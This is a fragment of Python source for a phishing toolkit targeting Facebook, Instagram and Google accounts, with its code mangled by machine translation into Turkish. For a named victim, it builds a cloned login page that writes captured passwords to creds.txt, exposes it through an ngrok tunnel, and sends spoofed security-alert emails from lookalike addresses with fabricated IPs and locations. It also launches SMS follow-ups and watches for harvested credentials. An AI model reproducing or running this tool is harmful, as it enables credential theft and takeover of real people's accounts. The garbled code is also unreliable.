auto;\n        }\n      img.fullwidth {\n        max-width: 100%!important;\n      }\n			img.fullwidthOnMobile {\n        max-width: 100%!important;\n      }\n      .no-stack .col {\n				min-width: 0!important;\n				display: table-cell!important;\n			}\n			.no-stack.two-up .col {\n				width: 50%!important;\n			}\n			.no-stack.mixed-two-up .col.num4 {\n				width: 33%!important;\n			}\n			.no-stack.mixed-two-up .col.num8 {\n				width: 66%!important;\n			}\n			.no-stack.three-up .col.num4 {\n				width: 33%!important\n			}\n			.no-stack.four-up .col.num3 {\n				width: 25%!important\n			}\n    }\n  </style>\n  <!--[if IE]><div class="ie-browser"><![endif]-->\n  <!--[if mso]><div class="mso-container"><![endif]-->\n  <table class="nl-container" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 320px;Margin: 0 auto;background-color: #FAF7F7;width: 100%" cellpadding="0" cellspacing="0">\n	<tbody>\n	<tr style="vertical-align: top">\n		<td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top">\n    <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td align="center" style="background-color: #FAF7F7;"><![endif]-->\n    <div style="background-color:transparent;">\n      <div style="Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: transparent;" class="block-grid mixed-two-up ">\n        <div style="border-collapse: collapse;display: table;width: 100%;background-color:transparent;">\n          <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background-color:transparent;" align="center"><table cellpadding="0" cellspacing="0" border="0" style="width: 480px;"><tr class="layout-full-width" style="background-color:transparent;"><![endif]-->\n              <!--[if (mso)|(IE)]><td align="center" width="160" style=" width:160px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->\n            <div class="col num4" style="display: table-cell;vertical-align: top;max-width: 320px;min-width: 160px;">\n              <div style="background-color: transparent; width: 100% !important;">\n              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->\n                  \n                    <div align="center" class="img-container center fixedwidth" style="padding-right: 0px;  padding-left: 0px;">\n<!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding-right: 0px; padding-left: 0px;" align="center"><![endif]-->\n  <img class="center fixedwidth" align="center" border="0" src="https://proxy.duckduckgo.com/iu/?u=http://pngimg.com/uploads/facebook_logos/facebook_logos_PNG19748.png&f=1" alt="Image" title="Image" style="outline: none;text-decoration: none;-ms-interpolation-mode: bicubic;clear: both;display: block !important;border: 0;height: auto;float: none;width: 100%;max-width: 80px" width="80">\n<!--[if mso]></td></tr></table><![endif]-->\n</div>\n                  \n                  \n                    <table border="0" cellpadding="0" cellspacing="0" width="100%" class="divider" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 100%;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n    <tbody>\n        <tr style="vertical-align: top">\n            <td class="divider_inner" style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;padding-right: 10px;padding-left: 10px;padding-top: 10px;padding-bottom: 10px;min-width: 100%;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                <table class="divider_content" align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;border-top: 1px solid #BBBBBB;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                    <tbody>\n                        <tr style="vertical-align: top">\n                            <td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                                <span></span>\n                            </td>\n                        </tr>\n                    </tbody>\n                </table>\n            </td>\n        </tr>\n    </tbody>\n</table>\n                  \n              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->\n              </div>\n            </div>\n              <!--[if (mso)|(IE)]></td><td align="center" width="320" style=" width:320px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->\n            <div class="col num8" style="display: table-cell;vertical-align: top;min-width: 320px;max-width: 320px;">\n              <div style="background-color: transparent; width: 100% !important;">\n              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->\n\n                  \n                    <!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding-right: 10px; padding-left: 10px; padding-top: 20px; padding-bottom: 10px;"><![endif]-->\n<div style="color:#0068A5;line-height:120%;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif; padding-right: 10px; padding-left: 10px; padding-top: 20px; padding-bottom: 10px;">	\n	<div style="font-size:12px;line-height:14px;color:#0068A5;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 12px;line-height: 14px;text-align: center"><span style="font-size: 42px; line-height: 50px;"><strong><span style="line-height: 50px; font-size: 42px;">Facebook</span></strong></span></p></div>	\n</div>\n<!--[if mso]></td></tr></table><![endif]-->\n\n                  \n                  \n                    <table border="0" cellpadding="0" cellspacing="0" width="100%" class="divider" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 100%;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n    <tbody>\n        <tr style="vertical-align: top">\n            <td class="divider_inner" style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;padding-right: 10px;padding-left: 10px;padding-top: 10px;padding-bottom: 10px;min-width: 100%;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n									 <table class="divider_content" align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;border-top: 1px solid #BBBBBB;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                    <tbody>\n                        <tr style="vertical-align: top">\n                            <td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                                <span></span>\n                            </td>\n                        </tr>\n                    </tbody>\n                </table>\n            </td>\n        </tr>\n    </tbody>\n</table>\n                  \n              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->\n              </div>\n            </div>\n          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->\n        </div>\n      </div>\n    </div>    <div style="background-color:transparent;">\n      <div style="Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: transparent;" class="block-grid ">\n        <div style="border-collapse: collapse;display: table;width: 100%;background-color:transparent;">\n          <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background-color:transparent;" align="center"><table cellpadding="0" cellspacing="0" border="0" style="width: 480px;"><tr class="layout-full-width" style="background-color:transparent;"><![endif]-->\n\n              <!--[if (mso)|(IE)]><td align="center" width="480" style=" width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->\n            <div class="col num12" style="min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;">\n              <div style="background-color: transparent; width: 100% !important;">\n              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->\n\n                  \n                    <!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;"><![endif]-->\n<div style="color:#0068A5;line-height:120%;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif; padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;">	\n	<div style="font-size:12px;line-height:14px;color:#0068A5;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 12px;line-height: 14px"><span style="font-size: 16px; line-height: 19px;">﻿Hello """+full_name+""", Your password was changed. </span>﻿</p></div>	\n</div>\n<!--[if mso]></td></tr></table><![endif]-->\n\n                  \n              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->\n              </div>\n            </div>\n          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->\n        </div>\n      </div>\n    </div>    <div style="background-color:transparent;">\n      <div style="Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: transparent;" class="block-grid ">\n        <div style="border-collapse: collapse;display: table;width: 100%;background-color:transparent;">\n          <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background-color:transparent;" align="center"><table cellpadding="0" cellspacing="0" border="0" style="width: 480px;"><tr class="layout-full-width" style="background-color:transparent;"><![endif]-->\n\n              <!--[if (mso)|(IE)]><td align="center" width="480" style=" width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->\n            <div class="col num12" style="min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;">\n              <div style="background-color: transparent; width: 100% !important;">\n              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->\n\n                  \n                    <!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;"><![endif]-->\n<div style = "color: # 9F7474; satır yüksekliği: 120%; font-family: Arial, 'Helvetica Neue', Helvetica, sans-serif; dolgu-sağ: 10 piksel; dolgu-sol: 10 piksel; dolgu üstü: 10 piksel; dolgu tabanı: 10 piksel; ">	 \ n 	<div stili =" yazı tipi boyutu: 12 piksel; satır yüksekliği: 14 piksel; renk: # 9F7474; yazı tipi ailesi: Arial, 'Helvetica Neue', Helvetica, sans-serif ; text-align: left; "> <p style =" kenar boşluğu: 0; yazı tipi boyutu: 12px; satır yüksekliği: 14px "> <strong> İşletim Sistemi:" "" + str ( OSZ ) + "" "& # 160; & # 160; & # 160; & # 160; & # 160; & # 160; & # 160; & # 160; </strong> <br> </p> <p style = "kenar boşluğu: 0; yazı tipi boyutu: 12 piksel; satır yüksekliği: 14 piksel"> <strong> IP: "" """"&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </strong></p></div>	\n</div>\n<!--[if mso]></td></tr></table><![endif]-->\n\n                  \n              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->\n              </div>\n            </div>\n          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->\n        </div>\n      </div>\n    </div>    <div style="background-color:transparent;">\n      <div style="Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: transparent;" class="block-grid ">\n        <div style="border-collapse: collapse;display: table;width: 100%;background-color:transparent;">\n          <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background-color:transparent;" align="center"><table cellpadding="0" cellspacing="0" border="0" style="width: 480px;"><tr class="layout-full-width" style="background-color:transparent;"><![endif]-->\n              <!--[if (mso)|(IE)]><td align="center" width="480" style=" width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->\n            <div class="col num12" style="min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;">\n              <div style="background-color: transparent; width: 100% !important;">\n              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->\n                  \n                    <!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;"><![endif]-->\n<div style="color:#0068A5;line-height:120%;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif; padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;">	\n	<div style = "font-size: 12px; satır yüksekliği: 14px; renk: # 0068A5; font-family: Arial, 'Helvetica Neue', Helvetica, sans-serif; metin hizalama: sol;"> <p stili = "kenar boşluğu: 0; yazı tipi boyutu: 14px; satır yüksekliği: 17px"> <span style = "font-size: 14px; line-height: 16px;"> Hesabınızı koruduğunuz için teşekkür ederiz, daha fazla bilgi için gidebilirsiniz destek sayfamıza fb.com/support. <br> </span> </p> <p style = "kenar boşluğu: 0; yazı tipi boyutu: 14px; satır yüksekliği: 17px"> <br> </p> </div>	 \ n </div> \ n </body> </html> "" " )
	alt süreç . call ([ 'sendemail' , '-f' , from_email , '-t' , str ( E-posta ), '-u' , 'Parola Değiştirildi' , '-m' , email_changed_body_html , '-s' , smtps + ": " + port , '-xu' , kullanıcı adı , '-xp' , şifre ])

	os . sistemi ( "sıfırla" )
	ENDst ()

################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################





def  Instagram ():

	instapic  =  ''


	Uname  =  giriş ( "" + Gri + "[" + Mavi + "Kullanıcı adı" + Gri + "]" + Yeşil + ":" + Sıfırla )

	Phone_try  =  giriş ( "" + Gri + "[" + Mavi + "Hedefleri var Telefon numarası" + Gri + "]" + Yeşil + "? -" + Gri + "[" + Mavi + "y" + Gri + " / " + Mavi + " N " + Gri + "] " + Yeşil + ": " + Sıfırla )

	eğer  Phone_try  ==  "N" :
		Telefon  =  " Telefon Yok"
	elif  Phone_try  ==  "y" :
		Telefon  =  giriş ( "" + Gri + "[" + Mavi + "Telefon" + Gri + "]" + Yeşil + ":" + Sıfırla )


	E-posta  =  giriş ( "" + Gri + "[" + Mavi + "E-posta" + Gri + "]" + Yeşil + ":" + Sıfırla )
	Email_try  =  giriş ( "" + Gri + "[" + Mavi + "" + Gri + "]" + Yeşil + "? -" + Gri + "[" + Mavi + "y" + için rastgele ayarlar kullanmak ister misiniz ? Gri + "/" + Mavi + "N" + Gri + "]" + Yeşil + ":" + Sıfırla )

	Eğer  Email_try  ==  N '' :
		Email_OS  =  giriş ( "" + Gri + "[" + Mavi + "OS" + Gri + "]" + Yeşil + ":" + Sıfırla )
		Email_time  =  giriş ( "" + Gri + "[" + Mavi + "Zaman" + Gri + "]" + Yeşil + ":" + Sıfırla )
		Email_from  =  giriş ( "" + Gri + "[" + Mavi + "Konum" + Gri + "]" + Yeşil + ":" + Sıfırla )
		Email_ip  =  giriş ( "" + Gri + "[" + Mavi + "IP" + Gri + "]" + Yeşil + ":" + Sıfırla )

	elif  Email_try  ==  'y' :
		Email_OS  =  rastgele . seçim ([ 'Windows 8' , 'Windows 7' , 'Windows 10' , 'Bilinmeyen' , 'Linux' , 'Android 6.0' , 'Android 5.0' , 'Android 4.0' , 'ios 10.1' , 'Mac OSX' ])
		Email_time  =  str ( rastgele . Seçim ([ '3:14' , '4:36' , '9:04' , '21: 43 ' , '14: 32' , '1:13' , '2:23' , '16: 56 ' , '10: 34' ])) +  "GMT"
		Email_from  =  "Kuzey Palm Beach, ABD"
		Email_ip  =  rastgele . seçim ([
			"104.131.141.114" ,
			"104.131.206.23" ,
			"104.131.245.55" ,
			"104.131.4.237" ,
			"104.131.65.225" ,
			"104.156.224.83" ,
			"104.163.133.75" ,
			"104.167.123.52" ,
			"104.168.53.37" ,
			"104.168.57.75" ,
			"104.169.47.152" ,
			"104.191.31.69" ,
			"104.192.102.156" ,
			"104.194.157.151" ,
			"104.199.115.227" ,
			"104.206.237.23" ,
			"104.209.44.248" ,
			"104.215.23.88" ,
			"104.218.63.72" ,
			"104.218.63.73" ])

	os . sistemi ( "sıfırla" )
	yazdır ( Mavi + " \ n          ___ ________ ________ _________ ________" )
	yazdır ( Mavi + "| \\   \\ | \\    ___   \\ | \\    ____ \\ | \\ ___ ___ \\ \\    __   \\             " )
	yazdır ( Mavi + "         \\  \\   \\  \\   \\ \\  \\   \\  \\   \\ ___ | \\ | ___ \\   \\ _ \\  \\   \\ | \\   \\            " )
	yazdır ( Mavi + "          \\  \\   \\  \\   \\ \\  \\   \\  \\ _____   \\    \\  \\   \\  \\  \\    __   \\           " )
	yazdır ( Mavi + "           \\  \\   \\  \\   \\ \\  \\   \\ | ____ | \\   \\    \\  \\   \\  \\  \\   \\  \\   \\          " )
	yazdır ( Mavi + "            \\  \\ __ \\  \\ __ \\ \\  \\ __ \\ ____ \\ _ \\   \\    \\  \\ __ \\  \\  \\ __ \\  \\ __ \ \         " )
	yazdır ( Mavi + "             \\ | __ | \\ | __ | \\ | __ | \\ _________ \\    \\ | __ |   \\ | __ | \\ | __ |" )
	yazdır ( Mavi + "                            \\ | _________ |" )
	baskı ( Mavi + "" )
	baskı ( Mavi + "" )
	baskı ( Mavi + "___ ___ ________ ________ ___ __ ________" )
	yazdır ( Mavi + "| \\   \\ | \\   \\ | \\    __   \\ | \\    __   \\ | \\   \\ | \\   \\ | \\    __   \\     " )
	yazdır ( Mavi + "             \\  \\   \\ \\ \\   \\  \\   \\ | \\   \\  \\   \\ | \\   \\  \\   \\ / / | \\  \\   \\ | \ \   \\    " )
	baskı ( Mavi + "              \\  \\    __   \\  \\   \\ \\ \\   \\  \\   \\ \\ \\   \\  \\    ___   \\  \\    __   \\   " )
	yazdır ( Mavi + "               \\  \\   \\  \\   \\  \\   \\ \\ \\   \\  \\   \\ \\ \\   \\  \\   \\ \\  \\   \\  \\   \\  \ \   \\ " )
	yazdır ( Mavi + "                \\  \\ __ \\  \\ __ \\  \\ _______ \\  \\ _______ \\  \\ __ \\ \\  \\ __ \\  \\ __ \\  \\ __ \\ " )
	yazdır ( Mavi + "                 \\ | __ | \\ | __ | \\ | _______ | \\ | _______ | \\ | __ | \\ | __ | \\ | __ | \\ | __ |" + Yeşil + " V1.0 \ n " )
	yazdır ( "" + Gri + "[" + Yeşil + "Saldırı Başladı" + Gri + "]" + Sıfırla )


	zaman . uyku ( 3 )
	link  =  "https://instagram.com/" + str ( Uname ) + "/"

	display  =  Display ( görünür = 0 , boyut = ( 800 , 600 ))
	görüntüler . başlangıç ()

	br  =  web sürücüsü . Firefox ( firefox_binary = ikili , çalıştırılabilir_yol = 'temel / geckodriver' )
	br . get ( bağlantı )
	zaman . uyku ( 8 )
	l  =  ''
	dene :
		l = br . find_element_by_css_selector ( "# reakt -root> bölüm> ana> div> başlık> div> div> div> düğme> img" ). get_attribute ( "src" )

	 İstisna hariç :
		l = br . find_element_by_css_selector ( "# tepki kökü> bölüm> ana> div> başlık> div> div> span> img" ). get_attribute ( "src" )

	br . kapat ()
	görüntüler . durdur ()

	phone_w = açık ( 'sms_support / phone' , 'w' )
	phone_w . yazma ( str ( Telefon ) + ":" + str ( Uname ))
	phone_w . kapat ()






	os . sistemi ( "rm -r WEBSERVER /" )

	alt süreç . call ([ 'mkdir' , '-p' , 'WEBSERVER /' ])

	filedata  =  str ( Main_Instagram )
	filedata  =  dosya verileri . değiştirin ( '[l]' , str ( l ))
	filedata  =  dosya verileri . replace ( '[Uname]' , str ( Uname ))

	ile  açık ( './WEBSERVER/index.html' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )
	dosyası . kapat ()

	logindata  =  str ( Login_Instagram )
	ile  açık ( './WEBSERVER/login.php' , 'w' ) olarak  dosya :
		dosyası . yazma (giriş verileri )
	dosyası . kapat ()

	secured_html  =  str ( Secured_Instagram )
	ile  açık ( './WEBSERVER/account_secured.html' , 'w' ) olarak  dosya :
		dosyası . yazma ( secured_html )
	dosyası . kapat ()


	os . sistemi ( "dokunmatik ./WEBSERVER/creds.txt" )
	os . sistemi ( "chmod -R 777 WEBSERVER /" )



	os . sistemi ( 'xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &' )
	os . sistemi ( "./ngrok http 80> / dev / null &" )

	zaman . uyku ( 3 )

	display  =  Display ( görünür = 0 , boyut = ( 800 , 600 ))
	görüntüler . başlangıç ()


	tarayıcı  =  webdriver . Firefox ( firefox_binary = ikili , çalıştırılabilir_yol = 'temel / geckodriver' )
	tarayıcı . get ( "http: // localhost: 4040 / status" )

	zaman . uyku ( 5 )

	url_f = str ( tarayıcı . find_element_by_css_selector ( "li.list-unstyled: nth-child (1)> div: nth-child (2)> tablo: nth-child (2)> tbody: nth-child (1)> tr : nth-child (1)> td: nth-child (2) " ). metin )
	tarayıcı . kapat ()
	phish_url  =  str ( url_f )


	email_template  =  str ( Email_Instagram )
	email_template  =  email_template . replace ( '[Uname]' , str ( Uname ))
	email_template  =  email_template . değiştir ( '[Email_OS]' , str ( Email_OS ))
	email_template  =  email_template . değiştir ( '[Email_time]' , str ( Email_time ))
	email_template  =  email_template . değiştir ( '[Email_from]' , str ( Email_from ))
	email_template  =  email_template . değiştir ( '[Email_ip]' , str ( Email_ip ))
	email_template  =  email_template . değiştir ( '[phish_url]' , str ( phish_url ))


	görüntüler . durdur ()

	from_email  =  rastgele . seçim ([ 'no-reply@instagrams.com' , 'security@instagrams.com' ])



	alt süreç . call ([ 'sendemail' , '-f' , from_email , '-t' , str ( E-posta ), '-u' , 'Güvenlik Uyarısı' , '-m' , email_template , '-s' , smtps + ": " + port , '-xu' , kullanıcı adı , '-xp' , şifre ])

	os . sistemi ( "sıfırla" )

	eğer  Phone_try  ==  "N" :
		geçmek
	elif  Phone_try  ==  "y" :
		os . sistemi ( "xterm -e \" python3 ./sms_support/instagram_sms.py \ " &" )

	banN ()

	yazdır ( "              \ 033 [0; 37m ########################################## ####### " )
	print ( "#   \ 033 [0mAd üzerindeki Krediler için Dinleme: \ 033 [0; 94m" + str ( Uname ) + " \ 033 [0; 37m #" )
	yazdır ( "################################################ # \ 033 [0; 93m " )
	yazdır ( "" + Gri + "[ \ 033 [0; 34m *" + Gri + "] - [" + Sıfırla + "EKSTRA-URL" + Gri + "]" + Sıfırla + ": \ 033 [0; 34m " + phish_url + " \ 033 [0; 93m \ n " )


	os . sistemi ( "kuyruk -f ./WEBSERVER/creds.txt" )

	yazdır ( " \ n                  \ 033 [0; 34m ######################################" )
	yazdır ( "# --DONE-- #" )
	yazdır ( "######################################" )

	os . sistemi ( "pkill -9 ngrok" )
	os . sistemi ( "pkill -9 php" )

	yazdır ( "son bir adım !! \ n " )

	IPZ = giriş ( Gri + "[" + Mavi + "IP" + Gri + "]" + Yeşil + ":" + Sıfırla )
	OSZ = giriş ( Gri + "[" + Mavi + "OS" + Gri + "]" + Yeşil + ":" + Sıfırla )

	Last_EM  =  str ( Email2_Instagram )
	Last_EM  =  Son_EM . replace ( '[Uname]' , str ( Uname ))
	Last_EM  =  Son_EM . değiştir ( '[OSZ]' , str ( OSZ ))
	Last_EM  =  Son_EM . değiştir ( '[IPZ]' , str ( IPZ ))


	alt süreç . call ([ 'sendemail' , '-f' , from_email , '-t' , E-posta , '-u' , 'Parola Değiştirildi' , '-m' , Son_EM , '-s' , smtps + “:” + bağlantı noktası , '-xu' , kullanıcı adı , '-xp' , şifre ])

	os . sistemi ( "sıfırla" )
	ENDst ()

################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################



def  Google ():
	utc  =  tarihsaat . datetime . utcnow ()
	loc  =  ""
	time1  =  ""

	em  =  giriş ( "" + Gri + "[" + Mavi + "E-posta" + Gri + "]" + Yeşil + ":" + Sıfırla )
	full_name  =  giriş ( "" + Gri + "[" + Mavi + "Hesapların Tam Adı" + Gri + "]" + Yeşil + ":" + Sıfırla )

	from_email  =  giriş ( "" + Gri + "[" + Mavi + "Sahte Posta" + Gri + "]" + Yeşil + ":" + Sıfırla )

	Phone_try  =  giriş ( "" + Gri + "[" + Mavi + "Hedefleri var Telefon numarası" + Gri + "]" + Yeşil + "? -" + Gri + "[" + Mavi + "y" + Gri + " / " + Mavi + " N " + Gri + "] " + Yeşil + ": " + Sıfırla )

	eğer  Phone_try  ==  "N" :
		Telefon  =  " Telefon Yok"
	elif  Phone_try  ==  "y" :
		Telefon  =  giriş ( "" + Gri + "[" + Mavi + "Telefon" + Gri + "]" + Yeşil + ":" + Sıfırla )

	rndm  =  giriş ( "" + Gri + "[" + Mavi + "" + Gri + "]" + Yeşil + "? -" + Gri + "[" + Mavi + "y" + için rastgele ayarlar kullanmak istiyorum Gri + "/" + Mavi + "N" + Gri + "]" + Yeşil + ":" + Sıfırla )
	eğer  RNDM  ==  "N" :
		time1  =  giriş ( "" + Gri + "[" + Mavi + "Zaman" + Gri + "]" + Yeşil + ":" + Sıfırla )
		loc  =  giriş ( "" + Gri + "[" + Mavi + "Konum" + Gri + "]" + Yeşil + ":" + Sıfırla )


	elif  rndm  ==  "y" :
		loc  =  'Kuzey Palm Beach, ABD'
		time1  =  str ( utc . strftime ( "% H:% M:% S" )) + "(UTC)"

	os . sistemi ( "sıfırla" )
	baskı ( Mavi + "________ ________ ________ ________" )
	yazdır ( Mavi + "| \\    ____ \\     | \\    __   \\ | \\    ____ \\ | \\    ____ \\                " )
	yazdır ( Mavi + "         \\  \\   \\ ___ |     \\  \\   \\ | \\   \\  \\   \\ ___ | \\  \\   \\ ___ |" )
	baskı ( Mavi + "          \\  \\   \\   ___    \\  \\    __   \\  \\   \\     \\  \\   \\                   " )
	yazdır ( Mavi + "           \\  \\   \\ | \\   \\ __ \\  \\   \\  \\   \\  \\   \\ ____ \\  \\   \\ ____" )
	yazdır ( Mavi + "            \\  \\ _______ \\ \\ __ \\  \\ __ \\  \\ __ \\  \\ _______ \\  \\ _______ \\            " )
	yazdır ( Mavi + "             \\ | _______ \\ | __ | \\ | __ | \\ | __ | \\ | _______ | \\ | _______ |" )
	baskı ( Mavi + "" )
	baskı ( Mavi + "" )
	baskı ( Mavi + "" )
	baskı ( Mavi + "___ ___ ________ ________ ___ __ ________" )
	yazdır ( Mavi + "| \\   \\ | \\   \\ | \\    __   \\ | \\    __   \\ | \\   \\ | \\   \\ | \\    __   \\     " )
	yazdır ( Mavi + "             \\  \\   \\ \\ \\   \\  \\   \\ | \\   \\  \\   \\ | \\   \\  \\   \\ / / | \\  \\   \\ | \ \   \\    " )
	baskı ( Mavi + "              \\  \\    __   \\  \\   \\ \\ \\   \\  \\   \\ \\ \\   \\  \\    ___   \\  \\    __   \\   " )
	yazdır ( Mavi + "               \\  \\   \\  \\   \\  \\   \\ \\ \\   \\  \\   \\ \\ \\   \\  \\   \\ \\  \\   \\  \\   \\  \ \   \\ " )
	yazdır ( Mavi + "                \\  \\ __ \\  \\ __ \\  \\ _______ \\  \\ _______ \\  \\ __ \\ \\  \\ __ \\  \\ __ \\  \\ __ \\ " )
	yazdır ( Mavi + "                 \\ | __ | \\ | __ | \\ | _______ | \\ | _______ | \\ | __ | \\ | __ | \\ | __ | \\ | __ |" + Yeşil + " V1.0 \ n " )
	yazdır ( "" + Gri + "[" + Yeşil + "Saldırı Başladı" + Gri + "]" + Sıfırla )




	url  =  "http://picasaweb.google.com/data/entry/api/user/" + em

	resp  =  istekler . get ( url )
	s  =  resp . Metin
	pic = 'http://geomla.grf.bg.ac.rs/site_media/static/landio/img/avatar.png'


	first_name  =  TAM_ISIM . şerit (). bölünmüş ( "" , 1 ) [ 0 ]


	eğer  s  ==  "Bilinmeyen kullanıcı." :
		geçmek

	başka :
		pic  =  str (( s . bölünmüş ( '<gphoto: küçük resim>' )) [ 1 ]. bölünmüş ( '</ gphoto: küçük resim>' ) [ 0 ])




	phone_w = açık ( 'sms_support / phone' , 'w' )
	phone_w . yazma ( str ( Telefon ) + ":" + str ( ad_adı ))
	phone_w . kapat ()

	os . sistemi ( "rm -r ./WEBSERVER" )
	os . sistemi ( 'mkdir ./WEBSERVER' )

	filedata  =  str ( Ana_Google )
	filedata  =  dosya verileri . değiştirin ( '[IMG]' , str ( resim ))
	filedata  =  dosya verileri . değiştir ( '[FULL_NAME]' , str ( tam_adı ))
	filedata  =  dosya verileri . değiştir ( '[NAME]' , str ( ad_adı ))
	filedata  =  dosya verileri . değiştir ( '[EMAIL]' , str ( em ))
